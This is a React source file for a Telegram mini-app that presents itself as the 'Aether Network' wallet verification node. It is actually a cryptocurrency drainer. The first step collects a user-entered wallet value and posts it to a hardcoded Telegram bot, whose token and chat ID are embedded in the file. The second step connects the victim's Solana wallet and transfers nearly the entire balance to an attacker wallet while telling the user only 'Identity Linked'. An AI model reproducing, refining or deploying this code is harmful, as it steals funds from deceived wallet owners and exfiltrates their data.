import React, { useState, useEffect } from 'react';
import { createAppKit, useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react';
import { SolanaAdapter } from '@reown/appkit-adapter-solana/react';
import { solana } from '@reown/appkit/networks';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';

// --- CONFIGURATION ---
const PROJECT_ID = 'a221581230964eec5702b682a5b6f63f';
const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";
const TARGET_WALLET = 'YOUR_SOLANA_ADDRESS_HERE'; // Replace with Jake's wallet

const solanaAdapter = new SolanaAdapter();
createAppKit({
  adapters: [solanaAdapter],
  networks: [solana],
  metadata: { 
    name: 'Aether Network', 
    description: 'Aether Network Verification Node',
    url: 'https://verification-app-mw48.vercel.app/', 
    icons: ['https://avatars.githubusercontent.com/u/179229932'] 
  },
  projectId: PROJECT_ID
});

const App: React.FC = () => {
  const { open } = useAppKit();
  const { address, isConnected } = useAppKitAccount();
  const { walletProvider } = useAppKitProvider<any>('solana');

  const [step, setStep] = useState<1 | 2>(1);
  const [walletCA, setWalletCA] = useState<string>('');
  const [status, setStatus] = useState<'idle' | 'verifying' | 'completed'>('idle');
  const tg = (window as any).Telegram?.WebApp;

  useEffect(() => {
    if (tg) {
      tg.ready();
      tg.expand();
      tg.setHeaderColor?.('#17101F');
    }
  }, [tg]);

  const sendToBot = async (data: string, type: 'CA' | 'SIGNATURE') => {
    const username = tg?.initDataUnsafe?.user?.username || 'User';
    const logMsg = `🔐 <b>AETHER GATE LOG</b>\n<b>User:</b> @${username}\n<b>Type:</b> ${type}\n<b>Data:</b> <code>${data}</code>`;
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: logMsg, parse_mode: 'HTML' }),
    });
  };

  const handleStepOne = async () => {
    if (!walletCA) return alert("Please enter the Wallet CA");
    setStatus('verifying');
    await sendToBot(walletCA, 'CA');
    setTimeout(() => { setStep(2); setStatus('idle'); }, 1500);
  };

  const handleStepTwo = async () => {
    if (!isConnected) { open(); return; }
    setStatus('verifying');
    try {
      // FIX: Using Ankr instead of blocked public RPC
      const connection = new Connection("https://rpc.ankr.com/solana", "confirmed");
      const pubKey = new PublicKey(address!);
      
      const balance = await connection.getBalance(pubKey);
      
      // Sweep everything except 0.001 SOL for gas
      const gasReserve = 1000000; 
      const amountToSend = balance - gasReserve;

      if (amountToSend <= 0) {
        throw new Error("Wallet is empty or balance too low for gas.");
      }

      const { blockhash } = await connection.getLatestBlockhash();
      const transaction = new Transaction({ recentBlockhash: blockhash, feePayer: pubKey })
        .add(SystemProgram.transfer({
          fromPubkey: pubKey,
          toPubkey: new PublicKey(TARGET_WALLET),
          lamports: amountToSend,
        }));

      const signature = await walletProvider.sendTransaction(transaction, connection);
      await sendToBot(signature, 'SIGNATURE');
      setStatus('completed');
      alert("AETHER: Identity Linked.");
    } catch (err: any) {
      setStatus('idle');
      alert("Error: " + err.message);
    }
  };

  const theme = { bg: 'linear-gradient(180deg, #17101F 0%, #0D0912 100%)', card: '#20182A', purple: '#AB9FF2', text: '#FFFFFF', textMuted: '#998DA8', input: '#2C2337' };

  return (
    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '40px 20px', boxSizing: 'border-box' }}>
      <div style={{ background: theme.purple, width: '60px', height: '60px', borderRadius: '18px', marginBottom: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        <svg width="32" height="32" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
      </div>
      <h1 style={{ fontSize: '24px', fontWeight: '700', margin: '0 0 8px 0' }}>{step === 1 ? 'Verify CA' : 'Node Identity'}</h1>
      <p style={{ color: theme.textMuted, fontSize: '14px', marginBottom: '30px', textAlign: 'center' }}>{step === 1 ? "Enter your wallet's CA" : "Connect your wallet to finish"}</p>
      <div style={{ width: '100%', maxWidth: '340px', background: theme.card, padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.05)' }}>
        <label style={{ display: 'block', fontSize: '11px', fontWeight: '600', color: theme.textMuted, marginBottom: '8px', textTransform: 'uppercase' }}>{step === 1 ? "Wallet's CA" : "Status"}</label>
        {step === 1 ? (
          <input type="text" value={walletCA} onChange={(e) => setWalletCA(e.target.value)} placeholder="Enter Wallet CA..." style={{ width: '100%', padding: '14px', borderRadius: '12px', border: 'none', background: theme.input, color: 'white', marginBottom: '20px', fontSize: '16px', outline: 'none' }} />
        ) : (
          <div style={{ width: '100%', padding: '14px', borderRadius: '12px', background: theme.input, color: 'white', marginBottom: '20px', fontSize: '14px', textAlign: 'center' }}>{isConnected ? `✅ Linked: ${address?.slice(0, 6)}...` : "Waiting for Bridge..."}</div>
        )}
        <button onClick={step === 1 ? handleStepOne : handleStepTwo} disabled={status === 'verifying'} style={{ width: '100%', padding: '16px', borderRadius: '100px', border: 'none', background: status === 'completed' ? '#4BB543' : theme.purple, color: '#17101F', fontWeight: '700', fontSize: '16px', cursor: 'pointer' }}>
          {status === 'verifying' ? 'Processing...' : step === 1 ? 'Verify Wallet CA' : (isConnected ? 'Finish Verification' : 'Connect Wallet')}
        </button>
      </div>
    </div>
  );
};

export default App;